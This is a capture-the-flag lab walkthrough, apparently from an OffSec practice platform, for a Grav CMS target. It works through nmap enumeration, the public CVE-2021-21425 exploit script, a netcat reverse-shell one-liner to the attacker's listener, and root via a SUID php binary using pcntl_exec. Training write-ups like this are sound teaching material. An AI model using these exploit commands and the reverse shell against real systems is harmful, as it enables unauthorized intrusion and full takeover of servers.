____

# Exploitation Guide for Astro

## Summary:

In this guide we will exploit an Unauthenticated Arbitrary YAML Write/Update in `Grav CMS` which leads to RCE to gain our initial foothold. In order to escalate privileges we will discover a vulnerable `PHP` SUID binary.

## Enumeration:

We begin the enumeration process with an `nmap` scan.

```bash
┌──(root㉿kali)-[/home/kali/ugc/gravity]
└─# nmap -p22,80 -sC -sV -oA nmap/gravity 192.168.145.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-17 09:04 EDT
Nmap scan report for 192.168.145.160
Host is up (0.00077s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:a9:43:8d:98:03:db:57:8c:be:9a:93:36:f9:34:13 (RSA)
|   256 70:2c:18:90:18:c0:a8:c5:7c:9b:a7:da:dc:7e:e9:32 (ECDSA)
|_  256 79:3d:a2:28:b8:dc:7b:0d:c4:53:ba:52:81:cc:ca:f8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume 
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)

```

From the output of our scan we see `grav-admin/` on port `80`.

Navigating to port `80` we see a default installation of `Grav CMS` and view the admin endpoint.

Navigating to `grav-admin/admin` we see the following login page.

![Untitled](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_CTF1_image_2_X1S8FT4L.png)

Untitled

When testing default credentials we see that we have gained access to the admin login page.

We proceed by searching for unauthenticated Grav CMS exploits and as seen below, we see a few CVEs.

One of the google results leads us to the following exploit:

Reference: [https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py](https://github.com/CsEnox/CVE-2021-21425/blob/main/exploit.py)

We download the exploit to our attack machine using `wget`.

```bash
┌──(root㉿kali)-[/home/kali/ugc/gravity]
└─# wget "https://raw.githubusercontent.com/CsEnox/CVE-2021-21425/main/exploit.py"
--2022-08-17 09:25:28--  https://raw.githubusercontent.com/CsEnox/CVE-2021-21425/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1892 (1.8K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                        100%[============================================================>]   1.85K  --.-KB/s    in 0s      

2022-08-17 09:25:29 (13.7 MB/s) - ‘exploit.py’ saved [1892/1892]
```

Now we use the exploit to ping our attack machine.

```bash
┌──(root㉿kali)-[/home/kali/ugc/gravity]
└─# python3 exploit.py -c 'ping -c1 192.168.145.128' -t http://192.168.145.160/grav-admin
[*] Creating File
Scheduled task created for file creation, wait one minute
[*] Running file
Scheduled task created for command, wait one minute
```

After approximately 1 minute, we recieve the ping packets.

```bash
┌──(root㉿kali)-[/home/kali]
└─# tcpdump -i eth0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:41:01.440075 IP 192.168.145.160 > 192.168.145.128: ICMP echo request, id 2, seq 1, length 64
09:41:01.440111 IP 192.168.145.128 > 192.168.145.160: ICMP echo reply, id 2, seq 1, length 64
```

Now we will proceed by attempting get a reverse shell.

We setup a listener on our attack machine.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
```

Now we update our command as seen below.

```bash
┌──(root㉿kali)-[/home/kali/ugc/gravity]
└─# python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.145.128 4444 >/tmp/f' -t http://192.168.145.160/grav-admin
[*] Creating File
Scheduled task created for file creation, wait one minute
[*] Running file
Scheduled task created for command, wait one minute
```

We receive a response in our listener as `www-data`.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.145.128] from (UNKNOWN) [192.168.145.160] 40906
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# Privilege Escalation

We search for any interesting SUID binaries and see `/usr/bin/php7.4` in the output.

```bash
www-data@gravity:~/html/grav-admin$ find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/at
/usr/bin/php7.4
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
```

Using `https://gtfobins.github.io/`, we see an entry for PHP and follow the listed steps in order to obtain root access.

```bash
www-data@gravity:~/html/grav-admin$ php -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:1d:44:e8 brd ff:ff:ff:ff:ff:ff
    inet 192.168.145.160/24 brd 192.168.145.255 scope global dynamic ens33
       valid_lft 1304sec preferred_lft 1304sec
    inet6 fe80::20c:29ff:fe1d:44e8/64 scope link 
       valid_lft forever preferred_lft forever
# hostname
gravity
#
```
